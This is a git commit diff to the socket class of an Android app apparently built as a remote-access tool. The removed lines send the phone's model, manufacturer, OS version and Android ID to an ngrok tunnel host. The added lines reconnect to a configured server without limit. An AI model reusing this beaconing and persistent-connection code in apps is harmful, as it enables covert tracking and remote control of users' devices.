0be0afe395f7d735b9ec58ffd971b314b4f7ee9c
uday.mekala <udaykiran0486@gmail.com>
2023-02-06 20:25:27 +0530

    updated IOSocket.java

--- app/src/main/java/com/remote/app/IOSocket.java
+++ app/src/main/java/com/remote/app/IOSocket.java
@@ -1,42 +1,37 @@
 package com.remote.app;
 
-import android.os.Build;
-import android.provider.Settings;
-import java.net.URISyntaxException;
+import java.net.URI;
+
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
 public class IOSocket {
-    private static IOSocket ourInstance = new IOSocket();
-    private io.socket.client.Socket ioSocket;
 
+    private static Socket socket;
 
-
-    private IOSocket() {
+    private static void connect() {
         try {
-
-            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
-            IO.Options opts = new IO.Options();
-            opts.reconnection = true;
-            opts.reconnectionDelay = 5000;
-            opts.reconnectionDelayMax = 999999999;
-
-            ioSocket = IO.socket("https://7f92-180-151-224-173.in.ngrok.io?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
-        } catch (URISyntaxException e) {
+            URI uri = URI.create(Constants.SOCKET_URL);
+            IO.Options options = IO.Options.builder()
+                    .setForceNew(false)
+                    .setReconnection(true)
+                    .setReconnectionDelay(1_000)
+                    .setReconnectionDelayMax(5_000)
+                    .setReconnectionAttempts(Integer.MAX_VALUE)
+                    .setRandomizationFactor(0.5d)
+                    .setTimeout(20_000)
+                    .setUpgrade(true)
+                    .build();
+            socket = IO.socket(uri, options);
+            socket = socket.connect();
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-
-    public static IOSocket getInstance() {
-        return ourInstance;
+    public static Socket getSocket() {
+        if (socket == null || !socket.isActive())
+            connect();
+        return socket;
     }
-
-    public Socket getIoSocket() {
-        return ioSocket;
-    }
-
-
-
-
 }
